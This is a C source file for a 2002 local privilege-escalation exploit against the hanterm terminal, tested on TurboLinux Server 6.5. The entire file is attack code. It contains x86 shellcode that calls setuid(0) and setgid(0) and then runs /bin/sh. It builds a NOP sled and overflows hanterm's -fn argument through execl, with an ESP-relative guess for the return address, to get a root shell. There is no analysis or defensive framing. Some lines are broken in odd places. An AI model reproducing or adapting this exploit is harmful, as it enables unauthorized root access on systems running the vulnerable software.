/* hanterm_exp.c
 *
 * local exploit for hanterm
 *  .. tested in TurboLinux Server 6.5 (Japan)
 *
 * thanks my Japanese friend kaju(kaijyu)
 * and Japanese hacker UNYUN.
 *
 *                  by xperc@hotmail.com
 *                         2002/02/07
 */

#include <stdio.h>

#define NOP		0x90
#define MAXBUF		88
#define RETOFS		84
#define SHELL_OFS 	22
#define ESP_OFS 	-0xe38

unsigned int get_esp()
{
	__asm__("mov %esp,%eax");
}

int main()
{
        static char shellcode[]={
            0x31,0xc0,0x31,0xdb,0xb0,0x17,0xcd,0x80,

0x31,0xc0,0x31,0xdb,0xb0,0x2e,0xcd,0x80,
            0xeb,0x18,0x5e,0x89,0x76,0x08,0x31,0xc0,

0x88,0x46,0x07,0x89,0x46,0x0c,0xb0,0x0b,
            0x89,0xf3,0x8d,0x4e,0x08,0x8d,0x56,0x0c,
            0xcd,0x80,0xe8,0xe3,0xff,0xff,0xff,0x2f,
            0x62,0x69,0x6e,0x2f,0x73,0x68,0x00
        };
        unsigned int retadr;
	char buf[MAXBUF];
        int i;

	memset(buf,NOP,MAXBUF);

	retadr=get_esp()+ESP_OFS;
	printf("Jumping address = %p\n",retadr);

	for(i=RETOFS-32;i<RETOFS+32;i+=4){
		buf[i]	=retadr&0xff;
		buf[i+1]=(retadr>>8)&0xff;
		buf[i+2]=(retadr>>16)&0xff;
		buf[i+3]=(retadr>>24)&0xff;
	}
	strncpy(buf+SHELL_OFS,shellcode,strlen
(shellcode));
	//buf[MAXBUF-1]='\0';       faint!:-(
	execl("/usr/bin/X11/hanterm","hanterm","-
fn",buf,(char *)0);
}

